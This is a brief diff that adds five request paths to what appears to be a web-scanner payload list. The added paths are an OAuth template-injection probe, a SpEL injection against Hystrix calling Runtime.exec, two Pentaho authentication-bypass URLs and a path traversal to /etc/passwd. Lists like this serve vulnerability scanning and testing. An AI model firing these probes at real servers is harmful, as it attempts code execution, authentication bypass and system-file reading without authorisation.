@@ -1,0 +1,5 @@
+/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
+/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(
+/pentaho/api/userrolelist/systemRoles?require-cfg.js
+/api/userrolelist/systemRoles?require-cfg.js
+/static/link/%2e%2e/etc/passwd
